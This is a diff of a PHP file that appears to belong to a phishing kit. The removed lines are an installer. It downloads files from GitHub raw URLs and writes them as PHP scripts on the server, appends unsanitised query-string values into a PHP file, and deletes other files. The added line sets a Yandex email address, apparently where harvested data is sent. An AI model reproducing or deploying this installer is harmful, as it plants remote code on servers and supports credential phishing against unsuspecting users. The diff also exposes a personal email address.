@@ -1,37 +1,3 @@
 <?php
-if (!isset($_GET[delete])){
-
-if (!isset($_GET['res'])){
-    mkdir("wafe");
-    $s = file_get_contents('https://raw.githubusercontent.com/admurkits/dropboxinstaller/master/aac');
-    $a = fopen("wafe/jvgdea.php", "w");
-    fwrite($a, $s);
-    fclose();
-    $jgh = fopen("amd.php", "w");
-    $jhhg = file_get_contents('https://raw.githubusercontent.com/admurkits/dropboxinstaller/master/lqamd');
-    fwrite($jgh, $jhhg);
-    fclose();
-    $h = file_get_contents('https://raw.githubusercontent.com/admurkits/dropboxinstaller/master/chtml');
-    echo $h;
-}else{
-    $asa = fopen("wafe/jvgdea.php", "a");
-    $l = $_GET['res'];
-    fwrite($asa, $l)or die ("gagal tulis 1");
-    fclose();
-    $isi = file_get_contents('https://raw.githubusercontent.com/admurkits/dropboxinstaller/master/aabc');
-    fwrite($asa, $isi) or die ("gagal tulis 2");
-    fclose();
-    $aha = $_GET['red'];
-    fwrite($asa, $aha) or die ("gagal tulis 3");
-    fclose();
-    $hja = file_get_contents('https://raw.githubusercontent.com/admurkits/dropboxinstaller/master/abcd');
-    fwrite($asa, $hja) or die ("gagal tulis 4");
-    fclose();
-    $olods = file_get_contents('https://raw.githubusercontent.com/admurkits/dropboxinstaller/master/olods');
-    echo $olods;
-}
-}else{
-    unlink("b.php");
-    unlink("c.php");
-    echo "evrything good";
-}
+$mail = 'ramdani.admur04@yandex.com';
+?>
